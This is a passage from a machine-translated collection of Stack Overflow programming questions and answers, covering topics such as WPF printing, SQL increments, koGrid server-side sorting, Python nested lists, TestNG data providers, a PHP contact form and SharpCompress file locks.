但我回来是空的。对于 KVC 可以执行的内容，我正在尝试的内容是否过于复杂？我是否需要遍历每个学校，*然后*遍历每个老师，然后才能搜索班级名称？或者，如果我想做的事情是可能的，我错过了什么？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-18T23:39:26.657

我假设通过

> 我需要 [...] 获取所有名为“History”的类名。

您的意思是获取与给定名称匹配的实际类字典。

我相信您的 JSON 字典对于 KVC 来说可能过于复杂，但仅在字典中的对象同时包含字典和数组的意义上，因此简单的谓词不能仅通过使用键来匹配。

我能够取回一组名称与“历史”匹配的类。我能够通过首先创建一个类数组然后过滤这些类来实现这一点。

```
NSDictionary *schoolsDictionary = ...
NSArray *schoolsArray = @[schoolsDictionary];

NSArray *classesArray = [schoolsArray valueForKeyPath:@"@unionOfArrays.schools.@unionOfArrays.teachers.@unionOfArrays.classes"];
NSArray *filteredClasses = [classesArray filteredArrayUsingPredicate:[NSPredicate predicateWithFormat:@"className = %@", @"History"]]; 
```

在这种情况下，结果将是

```
(
{
    classID = class01;
    className = History;
},
{
    classID = class01;
    className = History;
}
) 
```

# c# - 绘制线条与矩形时的奇怪行为

> ID：15232620
> 
> 赞同：3
> 
> 时间：2013-03-05T19:37:48.580
> 
> 标签：c#, wpf, canvas, line, scaletransform

好的，我该如何开始？

我有一个能够在屏幕上绘制一些形状（实际上是几千个）的应用程序。它们有两种类型：矩形和直线。矩形有填充，线条有 Stroke + StrokeThickness。

我从两个文件中读取数据，一个用于顶部，一个用于底部。为了显示数据，我使用了一个内部带有 Canvas 的 Viewbox（因此内容被很好地拉伸了）。显示器上的整个东西看起来像这样（这是正确的）：

![屏幕顶部](../Images/d7a80ecdc95460b5c007bb416897aaa1.png) ![屏幕底部](../Images/be60cda49ed0a3191fd088ca5c4dd7ab.png)

现在，同样的应用程序应该将此图像打印到打印机（为了测试，我使用 Windows 附带的 XPS 打印机）。

当我打印它时（代码如下），它为顶部提供了相同的图形，但为底部提供了以下内容：

![打印输出底部](../Images/1459a8244842bbd3725a606cb3a3ec13.png)

看起来所有“线条”都丢失了（矩形存在）。为了显示底部，我使用 -1/-1 的比例变换（水平和垂直镜像）。如果我将比例变换设置为 1/1，我会得到以下结果：

![底部 - 非镜像](../Images/365651a227ad7a13d84ae1844b362b9f.png)

现在我被困住了。为什么所有的线条都消失了，但如果没有镜像，它们就在那里。最外面的矩形也有一点偏移（这可能是由于数据，所以请不要专注于此）。

我用于在屏幕上绘图的代码是：

```
 <Viewbox Grid.Row="0" RenderTransform="{Binding RenderTransform}" Margin="20" Name="VwBox">
                <Viewbox.RenderTransformOrigin>
                    <Point X="0.5" Y="0.5"></Point>
                </Viewbox.RenderTransformOrigin>
                <ItemsControl ItemsSource="{Binding Drawing}" ItemTemplateSelector="{StaticResource DataTypeTemplateSelector}">
                    <ItemsControl.ItemsPanel>
                        <ItemsPanelTemplate>
                            <Canvas Width="{Binding DrawingWidth}" Height="{Binding DrawingHeight}">
                            </Canvas>
                        </ItemsPanelTemplate>
                    </ItemsControl.ItemsPanel>

                    <ItemsControl.ItemContainerStyle>
                        <Style TargetType="ContentPresenter">
                            <Setter Property="Canvas.Left" Value="{Binding Left}"/>
                            <Setter Property="Canvas.Top" Value="{Binding Top}"/>
                        </Style>
                    </ItemsControl.ItemContainerStyle>
                </ItemsControl>
            </Viewbox> 
```

对于打印，我不依赖 XAMl，而是手动进行（无论我是否使用 ContentPresenter，它都不会改变任何事情）：

```
 if (gs is GerberLine)
            {                   
                ContentPresenter cp = new ContentPresenter();
                var line = new Line();
                Canvas.SetLeft(cp, gs.Left);
                Canvas.SetTop(cp, gs.Top);
                line.X1 = 0.0;
                line.Y1 = 0.0;
                line.X2 = gs.Width;
                line.Y2 = gs.Height;
                line.Stroke = gs.Brush;
                line.StrokeThickness = ((GerberLine)gs).StrokeThickness;
                cp.Content = line;
                c.Children.Add(cp);
            }
            if (gs is GerberRect)
            {
                var r = new Rectangle();
                Canvas.SetLeft(r, gs.Left);
                Canvas.SetTop(r, gs.Top);
                r.Width = gs.Width;
                r.Height = gs.Height;
                r.Fill = gs.Brush;
                c.Children.Add(r);
            } 
```

看起来线条只会在我水平镜像它时消失，因为顶视图总是正确的（并且它也是垂直镜像的）。

有任何想法吗？如果有不清楚的地方，我会很乐意详细说明。我认为它与比例变换有关，但我不明白如何（以及为什么它会在屏幕上工作？）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T21:21:29.507

这是我会尝试的：

1.  也许 XPS 驱动程序特别不喜欢负缩放。使用不同的打印机（PDF 输出或真实打印机）进行测试。

2.  使用 Rotate(180) 而不是 Scale(-1,-1)。

3.  构建目标文档以供打印后，使用[RenderTargetBitmap](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.rendertargetbitmap.aspx)对其进行光栅化，保存生成的位图，然后查看是否符合预期。

4.  创建一个最小的 Gerber 模型并通过 XPS 代码路径发送。将 .xps 重命名为 .zip，并直接检查 XML（它将在`Documents\1\Pages\1.fpage`或类似的地方）。

# facebook-graph-api - 使用 J-SDK 发布到与应用或用户无关的页面

> ID：15232625
> 
> 赞同：0
> 
> 时间：2013-03-05T19:38:13.783
> 
> 标签：facebook-graph-api, permissions

我创建了一个 Facebook 网络应用程序，可以成功发布到用户墙，但是我也想同时发布到 Facebook 页面。如何将我的应用程序链接到这个 Facebook 页面，以便我也可以发布到 Facebook 页面墙......真的一直在到处搜索，却空手而归......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:49:18.960

没有自动的“每次用户发布内容时都在页面墙上发布”。您必须手动执行此操作。所以，这是一个两步过程

1.  在用户墙上发帖，这将需要一个用户`access_token`
2.  [在页面墙上发布](https://developers.facebook.com/docs/reference/api/page/#feed)，这将需要一个单独的页面 access_token。我假设你管理这个页面。按照此处列出的步骤来获取`access_token`：[Facebook 页面访问令牌](https://stackoverflow.com/questions/8231877/facebook-access-token-for-pages)这必须在服务器端完成，以防止泄露 access_token。所以需要一个 AJAX 调用。

# process - 带有 vfork 的 boost.asio

> ID：15232629
> 
> 赞同：1
> 
> 时间：2013-03-05T19:38:32.000
> 
> 标签：process, fork, boost-asio

众所周知，当`fork()`与 boost.asio 环境一起调用时，我们应该`notify_fork()`立即调用 before 和 after `fork()`。但是怎么样`vfork()`？我们应该在父进程和子进程中调用它们吗？我不这么认为，但在我的机器中，发生了意想不到的（和随机的）行为，但在调用它们之后，它运行良好。

PS：`vfork()`紧随其后的是`exec()`立即调用一个全新的进程。

请随时指出我出了什么问题。

# asp.net - IIS 7.5 缩放和优化

> ID：15232631
> 
> 赞同：0
> 
> 时间：2013-03-05T19:38:32.793
> 
> 标签：asp.net, iis, asp.net-mvc-4, iis-7.5

我有一个 mvc4 web api，它在 4 个物理服务器（运行 win2008R2 64 位的 64G 内存的 xeon 2.5Ghz 6 核 12 逻辑处理器）上平均服务（W3SVC_W3WP）50req/sec（每台服务器）。

最近，由于容量规划不佳，我们开始被新请求淹没，我们看到大量排队（asp.net v4.0.30319 Requests Queued = 2k-5k），总请求/秒高达约 200（之前平均为 50我们可以处理）。

我可以做些什么来帮助在四台服务器上扩展我的应用程序？

这是一些性能计数器的链接-> [http://bit.ly/WHFNv0](http://bit.ly/WHFNv0)

**给定**：

*   IIs 7.5 - 2 个网站（都公开 web rest api）在一个 64 位集成应用程序池上运行
*   每台服务器的 CPU ~25-55%
*   一个工作进程 (w3wp.exe)
*   队列长度 = 1000

**机器配置：**

```
<system.web>
    <processModel autoConfig="false" maxWorkerThreads="4095" maxIoThreads="4095" minIoThreads="2047"
        requestQueueLimit="5000" responseDeadlockInterval="00:03:00" />
    <httpRuntime minFreeThreads="704" minLocalRequestFreeThreads="608" />
</system.web> 
```

在 IIS 高级池设置中从 1 -> 2 设置最大工作进程似乎没有多大帮助。

# jenkins - Hudson / Jenkins or Bamboo, Can you store build plans in svn / git?

> ID：15232636
> 
> 赞同：1
> 
> 时间：2013-03-05T19:38:53.267
> 
> 标签：jenkins, continuous-integration, hudson, bamboo

We would like to keep a record of plans in svn or git so we can see what steps have changed in them over time. Is this possible with Hudson/Jenkins, or Bamboo?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:48:07.617

Jenkins / Hudson has an [SCM sync configuration plugin](https://wiki.jenkins-ci.org/display/JENKINS/SCM+Sync+configuration+plugin) that will automatically commit hanges to your job configurations. However, it currently only works with SVN.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:41:59.423

I cannot speak for bamboo, but hudson/jenkins jobs are XML files, so there is no reason you cannot store them in your favorite CM tool.

# c# - 从表中选择，然后将 (value + 1) 插入到另一个表中？

> ID：15232639
> 
> 赞同：1
> 
> 时间：2013-03-05T19:39:09.663
> 
> 标签：c#, asp.net, select, insert, dataset

感谢您查看我的问题。希望我能得到答案。我有一个 C# 项目。我正在尝试从表中获取 IF 字段。一旦我有了这些数据，我想将值增加 1。（例如，我抓取 10000，然后添加 1 使其成为 10001。）然后，我想将增加的值输入到另一个表中。

这是我到目前为止所拥有的（仅选择查询）：

```
cmd = new SqlCommand("select reqID from [RequestID] where (ID = 1)", con); 
```

我尝试使用 DataSet 没有任何进展。我对编码不太熟悉，但正在尝试！

```
DataSet ds = new DataSet();
myDA1.Fill(ds, "RequestID");
Int64 RequestID = default(Int64);
RequestID = ds.Table("RequestID").Rows(0).Item("ReqID");
RequestID += 1; 
```

任何帮助将不胜感激！

乔什

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:42:21.197

赶紧跑：

```
INSERT INTO yourOtherTable ( reqId ) 
SELECT reqID + 1 
FROM RequestID 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:45:17.183

您是否尝试从 SQL 中的表中获取值？

如果是这样，您可能不需要使用数据集，您只需要从 SQL 中读取值。

[Ado.Net 上的 MSDN 文章](http://msdn.microsoft.com/en-us/library/dw70f090.aspx#_SqlClient)

使用 SqlDataReader 获得值后，您可以增加它并重新插入它。

[使用 Ado.Net 的简单 CRUD 操作](http://www.codeproject.com/Articles/1155/Simple-ADO-NET-Database-Read-Insert-Update-and-Del)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:47:41.357

只需改变这个

样本

```
string sql1 = string.Format(@"select reqID from [RequestID] where (ID = 1)");
        SqlDataAdapter da1 = new SqlDataAdapter(sql1, con);
        DataSet ds1 = new DataSet();
        con.Open();
        da1.Fill(ds1);
        RequestID = ds.Table[0]["RequestID"]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T20:05:42.990

为什么不只是增加 SQL 中的值呢？它真的很擅长这种事情。有了你想要的结果，你可以做这样的事情。

```
cmd = new SqlCommand("select reqID + 1 as reqID from [RequestID] where (ID = 1)", con);
con.Open();
List<int> requestIds = new List<int>();
using(SqlDataReader reader = cmd.ExecuteReader()){
  while(reader.Read()){
    requestIds.Add(reader.GetInt32(0));
  } 
}
return requestIds;  // I find that Lists are much easier to work with 
// than DataTables, particularly for novices. 
```

如果你想要更明确的东西，这条线

```
 requestIds.Add(reader.GetInt32(0)); 
```

可以修改为：

```
 requestIds.Add(reader.GetInt32(0) + 1); 
```

与您保持查询相同。

编辑：由于评论而修改了回复：

> 谢谢回复。我想将该值输入到另一个表中，但我将“稍后”添加该值，以及最终用户将输入的所有其他数据。

# knockout.js - koGrid 排序 - 服务器端分页

> ID：15232644
> 
> 赞同：4
> 
> 时间：2013-03-05T19:39:22.730
> 
> 标签：knockout.js, kogrid

当有多个页面时，koGrid 似乎无法对所有项目进行排序。当您单击列标题时，它看起来好像只对显示的页面进行排序。当您转到下一页（或任何后续或上一页）时，数据不会根据您单击的列进行排序。甚至在 koGrid 网站上给出的“服务器端分页示例”中也是如此：

[http://ericmbarnard.github.com/KoGrid/#/examples](http://ericmbarnard.github.com/KoGrid/#/examples)

有没有人使用 koGrid 对多个页面进行排序？

谢谢你。

```
function EmailBlastsViewModel() {
  // Data
  var self = this;

  self.blasts = ko.observableArray();
  self.selectedItems = ko.observableArray();
  self.status = ko.observable('queued');

  self.pagingOptions = {
    pageSizes: ko.observableArray([25, 50, 100]),
    pageSize: ko.observable(25),
    totalServerItems: ko.observable(),
    currentPage: ko.observable(1)
  }

  self.pagingOptions.currentPage.subscribe(function(data) {
    self.reload();
  });

  self.pagingOptions.pageSize.subscribe(function(data) {
    self.reload();
  });

  self.gridOptions = {
    displaySelectionCheckbox: true,
    data : self.blasts,
    selectedItems: self.selectedItems,
    multiSelect: false,
    pagingOptions: self.pagingOptions,
    enablePaging: true,
    columnDefs: [
      { field: 'creator.name', displayName: 'From', width: 105 },
      { field: 'to_name', displayName: 'To', width: 105 },
      { field: 'subject', displayName: 'Subject', width: 160 },
      { field: 'status', displayName: 'Status', width: 132 },
      { field: 'date_scheduled', displayName: 'Date Scheduled', width: 160 },
      { field: 'date_sent', displayName: 'Date Sent', width: 160 },
      { displayName: ' ', cellTemplate: $('#cell-template').html(), width: 40 }
    ]
  }

  self.allMail = function(item, event) {
    self.status(null);
    self.reload()
  }

  self.queuedMail = function(item, event) {
    self.status('queued');
    self.reload()
  }

  self.sentMail = function(item, event) {
    self.status('sent');
    self.reload();
  }

  self.archiveEmail = function(item, event) {
    var email = self.selectedItems()[0];
    email.archive();
  }

  self.approveEmail = function(item, event) {
    var email = self.selectedItems()[0];
    email.approve();
  }

  self.rejectEmail = function(item, event) {
    var email = self.selectedItems()[0];
    email.reject();
  }

  self.deleteEmail = function(item, event) {
    var email = self.selectedItems()[0];
    email.deleteEmail();
  }

  self.reload = function() {
    var spinner = new Spinner().spin(document.getElementById('spin'));

    var data = {
      'page' : self.pagingOptions.currentPage(),
      'limit' : self.pagingOptions.pageSize()
    }

    if( self.status() ) {
      data['status'] = self.status()
    }

    $.ajax({
      type: "GET",
      data: data,
      cache: false,
      url: "/api/emailblast",
      contentType: "application/json",
      success: function(data, textStatus, jqXHR) {
        spinner.stop();

        var newData = [];

        $.each(data.results, function(index, value){
          var eb = new EmailBlast(self, value);
          newData.push( eb );
        })
        self.blasts( newData );
        self.pagingOptions.totalServerItems(data.total);
      },
      error: function(jqXHR, textStatus, errorThrown) {
        spinner.stop();
        noty({text: 'There was an error retrieving the email blasts.', type: 'error', timeout: 5000});
      }
    });
  }

  // Initialization
  self.init = function() {
    self.reload();
  }
  self.init();

};

emailBlastsViewModel = new EmailBlastsViewModel();
ko.applyBindings(emailBlastsViewModel); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T17:19:08.320

你的一些 KO 模型

```
self.sortInfo = ko.observable();
    self.sortOnServer = ko.observable(false);
    self.sortInfo.subscribe(function (data) {
        self.sortOnServer(!self.sortOnServer());
        if (!self.sortOnServer()) return;
        paginationInfo.SortColumnName = self.sortInfo().column.field;
        if (self.sortInfo().direction === 'desc') {
            paginationInfo.DescendingSort = true;
        } else {
            paginationInfo.DescendingSort = false;
        }
        showLoading();
        self.getPagedDataAsync(self.pagingOptions.pageSize(), self.pagingOptions.currentPage(), self.filterOptions.filterText());
    });

self.gridOptions = {
        data: self.results,
        enablePaging: true,
        pagingOptions: self.pagingOptions,
        filterOptions: self.filterOptions,
        columnDefs: self.columns,
        displaySelectionCheckbox: false,
        rowHeight: 20,
        selectWithCheckboxOnly: true,
        jqueryUIDraggable: true,
        useExternalSorting: true,
        sortInfo: self.sortInfo
    }; 
```

HTML

```
<div id="grid" class="gridStyle" data-bind="koGrid: gridOptions">
        </div> 
```

此代码将使用 sortInfo observable 在单击标题时更新字段和方向信息。我不得不向它添加一个hack，因为订阅被调用了两次。这是一个已知的错误，[https://github.com/Knockout-Contrib/KoGrid/issues/174](https://github.com/Knockout-Contrib/KoGrid/issues/174)。基本上，黑客使用 sortOnServer 可观察对象，只要它是真的，它就会将调用发送到服务器。

paginationInfo 是我创建的用于将信息传输到服务器的对象。

# python - Python：填充多维数组

> ID：15232648
> 
> 赞同：2
> 
> 时间：2013-03-05T19:39:31.527
> 
> 标签：python, arrays, multidimensional-array, nested, populate

我需要用工资等级和步骤填充一个二维数组。

```
salaryGrades = []
salaryStep = 0
salaryInc = 1000

for x in range (0,10):
    salaryStep+=100000
    salaryGrades.append([salaryStep])
    for x in salaryGrades:
        salaryInc=+1000
        x.append([salaryInc])

print (salaryGrades) 
```

这显然给了我一个不正确的数组。我需要每个数组增加 10k，每个嵌套数组增加 1000。

即 [ [10000],[11000],[12000],...][20000],[21000][22000],...] ] 高达 100k

我如何让这段代码工作，或者有更好的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:41:50.787

我会使用列表理解：

```
>>> salaryGrades = [list(range(s, s + 10000, 1000)) for s in range(10000, 100000, 10000)]
>>> salaryGrades
[[10000, 11000, 12000, 13000, 14000, 15000, 16000, 17000, 18000, 19000],
 [20000, 21000, 22000, 23000, 24000, 25000, 26000, 27000, 28000, 29000],
 [30000, 31000, 32000, 33000, 34000, 35000, 36000, 37000, 38000, 39000],
 [40000, 41000, 42000, 43000, 44000, 45000, 46000, 47000, 48000, 49000],
 [50000, 51000, 52000, 53000, 54000, 55000, 56000, 57000, 58000, 59000],
 [60000, 61000, 62000, 63000, 64000, 65000, 66000, 67000, 68000, 69000],
 [70000, 71000, 72000, 73000, 74000, 75000, 76000, 77000, 78000, 79000],
 [80000, 81000, 82000, 83000, 84000, 85000, 86000, 87000, 88000, 89000],
 [90000, 91000, 92000, 93000, 94000, 95000, 96000, 97000, 98000, 99000]] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T20:28:09.337

您也可以作为 numpy-onliner 执行此操作。

```
import numpy as np

print 1000*np.arange(10,100).reshape((9,10))

[[10000, 11000, 12000, 13000, 14000, 15000, 16000, 17000, 18000, 19000],
 [20000, 21000, 22000, 23000, 24000, 25000, 26000, 27000, 28000, 29000],
 [30000, 31000, 32000, 33000, 34000, 35000, 36000, 37000, 38000, 39000],
 [40000, 41000, 42000, 43000, 44000, 45000, 46000, 47000, 48000, 49000],
 [50000, 51000, 52000, 53000, 54000, 55000, 56000, 57000, 58000, 59000],
 [60000, 61000, 62000, 63000, 64000, 65000, 66000, 67000, 68000, 69000],
 [70000, 71000, 72000, 73000, 74000, 75000, 76000, 77000, 78000, 79000],
 [80000, 81000, 82000, 83000, 84000, 85000, 86000, 87000, 88000, 89000],
 [90000, 91000, 92000, 93000, 94000, 95000, 96000, 97000, 98000, 99000]] 
```

特别是对于大型数组，这可以加快您的代码速度，因为循环随后由使用 C 的 numpy 模块执行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:48:41.453

像这样修改您的代码：

```
for y in range (0,8):
  for x in range (0,9):
    salaryGrades[y][x] = (y+1)*10000 + x*1000 
```

# vbscript - 我正在尝试创建一个 vb 脚本来突出显示 excel 文件中的重复行。

> ID：15232652
> 
> 赞同：-1
> 
> 时间：2013-03-05T19:39:52.720
> 
> 标签：vbscript

我正在尝试创建一个 vb 脚本来突出显示 excel 文件中的重复行。

例子：

```
Firstname       Lastname
------------------------
Jack            Smith
Jack            Smith
Jack            Johnson 
```

我只希望`Jack Smith`突出显示两行而不是该`Jack Johnson`行。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T22:32:10.157

为此使用[条件格式](http://office.microsoft.com/en-001/excel-help/use-a-formula-to-apply-conditional-formatting-HA102809768.aspx)。首先用公式添加另一列

```
=A2&B2 
```

或（更通用）

```
=INDIRECT("A"&ROW())&" "&INDIRECT("B"&ROW()) 
```

并用它填充列。接下来选择工作表中的所有单元格并添加一个新的条件格式规则，其公式如下所示：

```
=COUNTIF($C:$C; INDIRECT("C"&ROW()))>1 
```

并选择一种格式。

根据需要调整列标识符（“A”、“B”和“C”）。

# installation - 使用名称和版本卸载 WMIC

> ID：15232655
> 
> 赞同：3
> 
> 时间：2013-03-05T19:39:54.743
> 
> 标签：installation, uninstallation, wmic

我有两个应用程序（旧的和新的）使用相同的产品名称（不能更改）。我只需要卸载旧版本，但在包含以下版本时遇到问题：

```
wmic product where name="AppName" call uninstall 
```

如何同时使用名称和版本来卸载？

版本对于我要卸载的特定旧应用程序和新应用程序是唯一的，但在本地计算机上可能不是唯一的，仅使用该版本调用卸载将删除具有匹配版本号的所有内容 - 我不能这样做:)

这一切都由新应用程序的安装程序执行（寻找旧应用程序，要求卸载等）。

# devexpress - 在 devexpress 中使用求和字段进行计算

> ID：15232658
> 
> 赞同：1
> 
> 时间：2013-03-05T19:40:03.440
> 
> 标签：devexpress, summary, xtrareport

我正在尝试获取基于参数填充的字段的值并使用它来计算总和。我相信这样做的方法是使用自定义摘要。我注意到 devexpress 具有 GetCurrentRow 和 GetCurrentColumn 方法，但我没有看到一种方法可以只获取该字段的值（在我的情况下为 xrTableCell43）并允许您在计算中使用它。例如：

我有一个看起来像这样的报告部分

2001 | 2
2002 | 4
2003 | 3
2004 | 1
2005 | 4

* * *

雷姆 6
共 20

但是，我在报告中放置了一个参数，允许用户选择要钻取的年份。因此，如果他们点击 2002，报告将如下所示：

第一季度 | 1
第二季度 | 1
第三季度 | 0
第四季度 | 2
2002 | 4

* * *

雷姆 6
共 20

这一切都完美无缺。这是我要修复的 Rem 字段。在这种情况下，Rem 字段应该是 14，因为它应该从总数中减去 2002 年和以前的年份。xrTableCell43 具有点击年份和之前所有年份的总和。如何在代码中编写 Tot - xrTableCell43 的值，以便此结果显示在 xrTableCell13 中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-30T14:52:53.037

正如您所说，对于自定义摘要事件来说，这似乎是一项不错的工作。要获取特定字段的值，请使用函数 GetCurrentColumnValue。

# javascript - 如何使用 HTML 页面中的值计算 JavaScript 中的值？

> ID：15232662
> 
> 赞同：-4
> 
> 时间：2013-03-05T19:40:13.037
> 
> 标签：javascript, html

我正在尝试在 js 中计算一个简单的乘法，如下所示：
A * B = C
D * E = F
G * H = I
总计 = C + F + I

然而，总数比预期的要大得多。我的乘法有问题还是我从页面中读取的值不正确？

下面是我的代码：

```
<html>
<head>
<script>
  calculate = function(totalElement)
  {
      if (totalElement)
      {
          var calculation  = '';
          var overall = '';
          var fields = new Array();
          var theElement = document.getElementById(totalElement);
          var userInputs = myform.elements;
          var the_type = '';
          for (var f = 0; f < userInputs.length; f++)
          {
              if (userInputs[f].className=='special_value')
              {
                 if(userInputs[f].value != "")
                 {
                     document.getElementById("price4").value+=+userInputs[f].value;

                 }           

              }
          }

      }
  }
</script>
</head>
<body>
<form name="myform">
A<input onKeyPress="calculate('total');" onBlur="calculate('total');" class="special_value" value="" type="text" name="price"> 
B<input onKeyPress="calculate('total');" onBlur="calculate('total');" class="special_value" type="text" value="" name="price2"> 
C<input onKeyPress="calculate('total');" onBlur="calculate('total');" class="special_value" type="text"value=""  name="price4" id="price4"> <Br/>
D<input onKeyPress="calculate('total');" onBlur="calculate('total');" class="special_value" value="" type="text" name="price5"> 
E<input onKeyPress="calculate('total');" onBlur="calculate('total');" class="special_value" type="text" value="" name="price6"> 
F<input onKeyPress="calculate('total');" onBlur="calculate('total');" class="special_value" type="text"value=""  name="price7" id="price7"> <Br/>
Total<input class="special_value" value="" id="total" type="text" name="total"> <Br/>
<!-- <div id="total"></div> -->
<input onClick="calculate('total');" type="button" name="button" value="re-calculate">
</form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T19:44:39.620

`document.getElementById("price4").value`是一个字符串。您可能会连接字符串，而不是对它们进行数学运算。

尝试：`parseFloat(document.getElementById("price4").value)`

# java - TestNG 使用单线程数据提供程序并行运行

> ID：15232664
> 
> 赞同：0
> 
> 时间：2013-03-05T19:40:18.777
> 
> 标签：java, multithreading, testng

我想利用来自数据提供者的 1 个调用计数的并行测试，我该如何实现？

这是一些示例代码：

```
public class Example {

  @Test(dataProvider = "provider", threadPoolSize = 20)
  public void test(final TestData td) {
    System.out.println(td);
    Assert.assertTrue(td.i >= 0);
  }

  @DataProvider
  public Object[][] provider() {
    final Random r = new Random(System.currentTimeMillis());
    final Object[][] data = new TestData[5][1];
    for (int i = 0; i < 5; i++) {
      data[i][0] = new TestData(r.nextInt(5), i, "test string");
    }
    return data;
  }

  private class TestData {
    public int random;
    public int creationNum;
    public String s;

    public TestData(final int random, final int creationNum, final String s) {
      this.random = random;
      this.creationNum = creationNum;
      this.s = s;
    }

    @Override
    public String toString() {
      final List<String> list = new ArrayList<>();
      for (int j = 0; j < i; j++) {
        list.add(s);
      }
      return "I = " + i + ", Creation Num: " + creationNum + ", " + StringUtils.join(list, ", ");
    }
  }
} 
```

所以当我运行这个测试时，我希望看到 creationNumber 以随机顺序出现。问题是如果未提供 invocationCount，则忽略 threadPoolSize。如果我提供，我将看到用于多个测试的相同 TestData 实例——我不希望发生这种情况。有没有办法让我以线程方式运行此测试而无需多次测试相同的数据？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:51:23.163

您可以制作 @DataProvider(parallel = true) 并使用您的 dataproviderthreadcount 来控制要生成的并行线程数。

# php - 在 HTML 页面上显示 php msg

> ID：15232670
> 
> 赞同：1
> 
> 时间：2013-03-05T19:40:34.983
> 
> 标签：php, html, web

我正在开发一个静态网站，其中有一个联系我们页面。在这里，我想要做的是在提交联系表格时，它应该显示消息 - 电子邮件已成功发送。但问题是我正在调用 html 页面，我们无法在 html 视图中传递 php 消息。那么有什么办法可以完成。联系方式.php

```
<?php
$error = '';

$mailTo = $_POST['email'];
$mailFrom = 'info@sample.com';
//$headers  = 'MIME-Version: 1.0' . "\r\n";
//$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$fullname = $_POST['username'];
$phoneno = $_POST['mobile'];
$emailaddress = $_POST['email'];
$msgsubject =$_POST['message'];
$new = "\n";
$msg =  $fullname.$new.$emailaddress.$new.$phoneno.$new.$msgsubject;

$to      = $email;
    $subject = 'Inquiry';
    $messageclient = '<div>

<p>Thank you For Inquiry.</p>
<p> We will reach back to you shortly. Have a Nice Day!</p>
<p>Company © 2013</p>
</p></div>
';
    $headers = 'From: info@email.com' . "\r\n" .
        'Reply-To: info@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    $headers .= "MIME-Version: 1.0\r\n"; 
    $headers .= "Content-type: text/html; charset=utf-8\r\n"; 
    $headers .= "From: Company<info@email.com>\r\n";
    //$res = mail($to, $subject, $message, $headers);

//$message ='Thank you For Inquiry. We will reach back to you shortly. Have a Nice Day';
mail( $mailTo , $subject,  $messageclient, $headers);

$message .= "<p>Name: $fullname</p><br /><p>Contact Number : $phoneno</p><br />        <p>Email: $emailaddress</p><br /><p>Message: $msgsubject</p>";

mail( $mailFrom, $subject,$message, $headers); 

header("location:home.html");
?> 
```

非常感谢您的帮助，在此先感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:43:54.903

这里有很多问题，但要回答你的问题，你不能在内容发送后重定向。

如果您添加`ob_start()`到页面顶部，它将缓冲内容并允许重定向。

之后，进一步重新阅读您的帖子，也许我误解了。看起来您不是在发送内容，这意味着您的重定向正在工作，但您想要的是在重定向后添加一条消息。

你有选择。

1.  重定向到反映您要传达的信息的静态 HTML 页面。
2.  重定向到具有向用户发送消息的逻辑的 PHP 页面。
3.  使用 Ajax 发送电子邮件并且根本不重定向。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:00:03.273

如果您可以配置 Web 服务器，则可以将其更改为将 html 页面视为 php 页面。例如在 APACHE 的 httpd.conf 中：

AddType application/x-httpd-php .php .htm .html

希望这对你有用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T19:43:16.187

您可能希望在提交时执行 ajax 请求以防止更改页面，或者在处理邮件功能后创建一个您将重定向到的登录页面

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T19:45:48.313

将此电子邮件发送功能作为 ajax 调用执行，并在成功时向用户显示成功消息。

# c# - SharpCompress 解包锁定文件

> ID：15232672
> 
> 赞同：0
> 
> 时间：2013-03-05T19:40:59.470
> 
> 标签：c#, locking

我试图创建一个过程，使用 SharpCompress 解压缩一组 rar 文件，然后删除它们。

我首先有一个 foreach 循环，它遍历要解压缩的不同文件集，如下所示：

```
foreach (var package in extractionPackages.Where(package => Extractor.ExtractToFolder(package, destinationFolder)))
        {
            FileHelper.DeleteExtractionFiles(package);
        } 
```

提取过程直接采用 SharpCompress 测试代码，如下所示：

```
public static bool ExtractToFolder(ExtractionPackage extractionPackage, string extractionPath)
    {
        var fullExtractionPath = Path.Combine(extractionPath, extractionPackage.FolderName);
        try
        {
            using (var reader = RarReader.Open(extractionPackage.ExtractionFiles.Select(p => File.OpenRead(p.FullPath))))
            {
                while (reader.MoveToNextEntry())
                {
                    reader.WriteEntryToDirectory(fullExtractionPath, ExtractOptions.ExtractFullPath | ExtractOptions.Overwrite);
                }

            }

            return true;
        }
        catch (Exception)
        {
            return false;
        }
    } 
```

正如您在第一个代码块中看到的那样，我然后调用删除文件，但由于文件被另一个进程锁定，我收到一个错误： **该进程无法访问文件'file.rar'，因为它正在被使用另一个过程。**

如果我尝试在 foreach 循环之后进行删除，如果有多个文件，我可以删除除最后一组文件之外的所有文件。如果它只是一个相同的问题，因为最后一组文件似乎没有被“解锁”。

如何构建代码以解锁文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-10T12:51:47.407

通过使用 Nunrar 的示例并对其进行一些修改，我似乎终于解决了这个问题：

```
public static bool ExtractToFolder(ExtractionPackage extractionPackage, string extractionPath)
    {
        var fullExtractionPath = Path.Combine(extractionPath, extractionPackage.FolderName);

        try
        {
